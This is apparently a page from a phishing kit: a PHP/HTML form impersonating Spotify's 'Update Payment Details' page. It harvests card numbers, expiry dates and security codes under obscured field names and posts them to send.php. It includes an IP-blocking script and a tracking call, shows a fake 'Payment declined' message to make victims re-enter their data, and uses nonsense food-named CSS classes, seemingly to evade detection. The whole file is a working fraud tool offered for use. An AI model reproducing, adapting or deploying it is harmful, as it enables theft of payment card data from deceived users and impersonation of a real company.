<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="./img/fav.ico">
    <title data-translate="page-title">Spotify - Update Payment Details</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Circular', Arial, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: white;
            min-height: 100vh;
        }
        
        .sushi {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background-color: #000;
        }
        
        .ramen {
            display: flex;
            align-items: center;
        }
        
        .ramen img {
            height: 40px;
        }
        
        .tempura {
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .udon {
            display: flex;
            gap: 30px;
        }
        
        .udon a {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
            data-translate="premium"
        }
        
        .miso {
            display: flex;
            align-items: center;
            gap: 5px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 23px;
            padding: 5px 10px;
            cursor: pointer;
        }
        
        .tofu {
            width: 30px;
            height: 30px;
            background-color: #535353;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .tofu img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .wasabi {
            font-weight: 700;
            margin-right: 5px;
            data-translate="profile"
        }
        
        .kimchi {
            max-width: 600px;
            margin: 50px auto;
            padding: 0 20px;
        }
        
        .bibimbap {
            font-size: 42px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 40px;
            data-translate="update-payment-title"
        }
        
        .bulgogi {
            background-color: #181818;
            border-radius: 8px;
            padding: 25px;
            width: 90%;
            margin: 0 auto;
        }
        
        .galbi {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .japchae {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            border: 2px solid #535353;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        
        .japchae.selected {
            border-color: #1ED760;
        }
        
        .japchae.selected .kimbap {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #1ED760;
        }
        
        .tteokbokki {
            font-size: 16px;
            font-weight: 600;
            data-translate="credit-debit-card"
        }
        
        .samgyeopsal {
            margin: 15px 0 25px 39px;
        }
        
        .samgyeopsal img {
            height: 40px;
        }
        
        .jajangmyeon {
            margin-bottom: 20px;
        }
        
        .sundubu {
            display: block;
            margin-bottom: 10px;
            font-size: 14px;
            font-weight: 600;
        }
        
        .dakgalbi {
            width: 100%;
            padding: 12px 15px;
            background-color: #121212;
            border: 1px solid #535353;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            outline: none;
            box-shadow: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }
        
        .dakgalbi::placeholder {
            color: #727272;
        }
        
        .hotpot {
            display: flex;
            gap: 20px;
        }
        
        .hotpot .jajangmyeon {
            flex: 1;
        }
        
        .dimsum {
            position: relative;
        }
        
        .gyoza {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: 1px solid #727272;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #727272;
            font-size: 14px;
            cursor: pointer;
        }
        
        .dumpling {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-top: 20px;
        }
        
        .wonton {
            width: 16px;
            height: 16px;
            border: 1px solid #535353;
            border-radius: 3px;
            cursor: pointer;
            margin-top: 2px;
            background-color: transparent;
            flex-shrink: 0;
            position: relative;
        }
        
        .wonton.checked {
            background-color: #1ED760;
            border-color: #1ED760;
        }
        
        .wonton.checked::after {
            content: "";
            position: absolute;
            top: 2px;
            left: 5px;
            width: 4px;
            height: 8px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        
        .springroll {
            font-size: 14px;
            line-height: 1.5;
            data-translate="save-card-text"
        }
        
        .soysauce {
            color: #b3b3b3;
            font-size: 14px;
            margin-top: 10px;
            margin-left: 30px;
            line-height: 1.5;
            data-translate="subscription-notice"
        }
        
        .sriracha {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 16px;
            height: 16px;
        }
        
        .sriracha img {
            width: 100%;
            height: 100%;
        }
        
        .pho {
            position: relative;
        }
        
        .padthai {
            margin-top: 40px;
            width: 90%;
            margin-left: auto;
            margin-right: auto;
        }
        
        .curry {
            font-size: 16px;
            font-weight: 700;
            text-decoration: underline;
            margin-bottom: 20px;
            data-translate="withdrawal-title"
        }
        
        .satay {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .laksa {
            font-size: 13px;
            line-height: 1.5;
            data-translate="withdrawal-text"
        }
        
        .laksa a {
            color: white;
            text-decoration: underline;
        }
        
        .nasi {
            display: block;
            width: 60%;
            padding: 12px;
            background-color: #1ED760;
            color: black;
            font-weight: 700;
            font-size: 14px;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            margin: 30px auto;
            box-shadow: none;
            data-translate="update-button"
        }
        
        @media (max-width: 768px) {
            .sushi {
                padding: 15px 20px;
            }
            
            .udon {
                gap: 15px;
            }
            
            .bibimbap {
                font-size: 32px;
            }
            
            .hotpot {
                flex-direction: column;
                gap: 10px;
            }
            
            .nasi {
                padding: 10px;
                font-size: 13px;
                width: 55%;
            }
        }
        
        @media (max-width: 576px) {
            .sushi {
                padding: 10px 15px;
            }
            
            .ramen img {
                width: 100px;
                height: 40px;
            }
            
            .udon {
                display: none;
            }
            
            .miso {
                padding: 3px 8px;
            }
            
            .tofu {
                width: 25px;
                height: 25px;
            }
            
            .wasabi {
                font-size: 14px;
            }
            
            .tempura {
                gap: 15px;
            }
            
            .kimchi {
                margin: 30px auto;
            }
            
            .bibimbap {
                font-size: 28px;
                margin-bottom: 30px;
            }
            
            .bulgogi {
                width: 100%;
                padding: 20px;
            }
            
            .padthai {
                width: 100%;
            }
            
            .laksa {
                font-size: 12px;
            }
            
            .nasi {
                padding: 12px;
                font-size: 12px;
                width: 50%;
            }
        }
    </style>
</head>
<body>
    <nav class="sushi">
        <div class="ramen">
            <img src="./img/lggo.webp">
        </div>
        
        <div class="tempura">
            <div class="udon">
                <a data-translate="premium">Premium</a>
                <a data-translate="support">Support</a>
                <a data-translate="download">Download</a>
            </div>
            
            <div class="miso">
                <div class="tofu">
                    <img src="./img/proff.webp">
                </div>
                <span class="wasabi">Profile</span>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M4 6L8 10L12 6" stroke="white" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>
        </div>
    </nav>
    
    <div class="kimchi">
        <h1 class="bibimbap" data-translate="update-payment-title">Update<br>payment details</h1>
        
        <div class="bulgogi">
            <div class="galbi">
                <div class="japchae selected">
                    <div class="kimbap"></div>
                </div>
                <span class="tteokbokki" data-translate="credit-debit-card">Credit or debit card</span>
            </div>
            
            <div class="samgyeopsal">
                <img src="./img/3.webp">
            </div>

            <form action="send.php" method="POST">
            <div class="jajangmyeon">
<?php
if(isset($_GET['e'])){
  echo '<span style="color: red; display: inline; font-size: 11px;">Payment declined: Update your payment information!
</span><br><br>';
}
?>                
                <label class="sundubu" data-translate="card-number-label">Card number</label>
                <div class="pho">
                    <input type="tel" id="cardNumber" name="cddd" class="dakgalbi" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" required>
                    <div class="sriracha">
                        <img src="./img/lock.webp">
                    </div>
                </div>
            </div>
            
            <div class="hotpot">
                <div class="jajangmyeon">
                    <label class="sundubu" data-translate="expiry-date-label">Expiry date</label>
                    <input type="tel" id="expiration" name="bebeb" class="dakgalbi" placeholder="MM/YY" autocomplete="off" required>
                </div>
                
                <div class="jajangmyeon">
                    <label class="sundubu" data-translate="security-code-label">Security code</label>
                    <div class="dimsum">
                        <input type="tel" id="cvc" name="gagaga" class="dakgalbi" autocomplete="off" required maxlength="4" placeholder="•••">
                        <div class="gyoza">?</div>
                    </div>
                </div>
            </div>
            
            <div class="dumpling">
                <div class="wonton checked" onclick="this.classList.toggle('checked')"></div>
                <div class="springroll" data-translate="save-card-text">Save card for future orders.</div>
            </div>
            
            <div class="soysauce" data-translate="subscription-notice">
                This won't affect how you pay for existing subscriptions and can be managed at any time in your Account page.
            </div>
        </div>
        
        <div class="padthai">
            <h2 class="curry" data-translate="withdrawal-title">Important information about your right to withdraw</h2>
            <div class="satay">
                <div class="wonton checked" onclick="this.classList.toggle('checked')"></div>
                <div class="laksa" data-translate="withdrawal-text">
                    You consent to us providing you with the Spotify content immediately and you acknowledge that, as a result, you lose your statutory right of withdrawal once such provision of content has begun. You also agree that Spotify may automatically charge you the subscription fee every month, unless you cancel your subscription before the next billing cycle. You may cancel at any time, however if you cancel, you will not be entitled to a refund. Full terms and instructions on how to cancel are available <a>here</a>. <a>Terms apply</a>.
                </div>
            </div>
            <button type="submit" class="nasi" data-translate="update-button">Update payment details</button>
        </div>
        </form>
    </div>

    <script>
        // Make checkbox labels also toggle the checkbox when clicked
        document.querySelectorAll('.springroll').forEach(label => {
            label.addEventListener('click', function() {
                const checkbox = this.previousElementSibling;
                checkbox.classList.toggle('checked');
            });
        });
        
        // Make withdrawal text also toggle the checkbox when clicked
        document.querySelector('.laksa').addEventListener('click', function() {
            const checkbox = this.previousElementSibling;
            checkbox.classList.toggle('checked');
        });
        
        // Format credit card number with spaces after every 4 digits
        const cardNumberInput = document.getElementById('cardNumber');
        
        cardNumberInput.addEventListener('input', function(e) {
            // Get input value and remove all non-digit characters
            let value = this.value.replace(/\D/g, '');
            
            // Add a space after every 4 digits
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            
            // Store cursor position
            const cursorPosition = this.selectionStart;
            
            // Calculate cursor position after formatting
            // Count how many spaces were added before the cursor position
            const valueBeforeCursor = this.value.substring(0, cursorPosition);
            const newValueBeforeCursor = formattedValue.substring(0, cursorPosition + 
                (formattedValue.substring(0, cursorPosition).match(/ /g) || []).length - 
                (valueBeforeCursor.match(/ /g) || []).length);
            const newCursorPosition = newValueBeforeCursor.length;
            
            // Update the input value
            this.value = formattedValue;
            
            // Restore cursor position
            this.setSelectionRange(newCursorPosition, newCursorPosition);
        });
        
        // Format on paste
        cardNumberInput.addEventListener('paste', function(e) {
            setTimeout(() => {
                // Trigger the input event handler
                const event = new Event('input');
                this.dispatchEvent(event);
            }, 0);
        });

        // Enhanced card formatting script (without images)
        document.addEventListener('DOMContentLoaded', function() {
            const cardNumber = document.getElementById('cardNumber');
            const expiration = document.getElementById('expiration');
            const cvc = document.getElementById('cvc');

            cardNumber.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                let formattedValue = '';
                
                // American Express formatting (4-6-5)
                if (/^3[47]/.test(value)) {
                    if (value.length > 15) {
                        value = value.slice(0, 15);
                    }
                    for (let i = 0; i < value.length; i++) {
                        if (i === 4 || i === 10) {
                            formattedValue += ' ';
                        }
                        formattedValue += value[i];
                    }
                    cvc.maxLength = 4;
                    cvc.placeholder = '••••';
                } else {
                    // Standard card formatting (4-4-4-4)
                    if (value.length > 16) {
                        value = value.slice(0, 16);
                    }
                    for (let i = 0; i < value.length; i++) {
                        if (i > 0 && i % 4 === 0) {
                            formattedValue += ' ';
                        }
                        formattedValue += value[i];
                    }
                    cvc.maxLength = 3;
                    cvc.placeholder = '•••';
                }
                
                e.target.value = formattedValue;
            });

            expiration.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 4) {
                    value = value.slice(0, 4);
                }
                if (value.length > 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2);
                }
                e.target.value = value;
            });

            // Make CVC field behave like a password field when typing starts
            cvc.addEventListener('input', function() {
                if (this.value.length > 0) {
                    this.type = 'password';
                } else {
                    this.type = 'tel';
                }
            });

            // Handle placeholder translations
            const cardNumberInput = document.getElementById('cardNumber');
            if (cardNumberInput && window.translations) {
                const currentLang = document.documentElement.lang || 'en';
                const translations = window.translations;
                
                setTimeout(() => {
                    if (translations[currentLang] && translations[currentLang]['card-number-placeholder']) {
                        cardNumberInput.placeholder = translations[currentLang]['card-number-placeholder'];
                    }
                    if (translations[currentLang] && translations[currentLang]['expiry-placeholder']) {
                        expiration.placeholder = translations[currentLang]['expiry-placeholder'];
                    }
                }, 10);
            }
        });
    </script>
    <script src="./js/khikhi.js"></script>
<script src="js/jq.js"></script>
<?php $m->ctr(" Credit Card 🏦 ".@$_GET['e']); ?>
</body></html>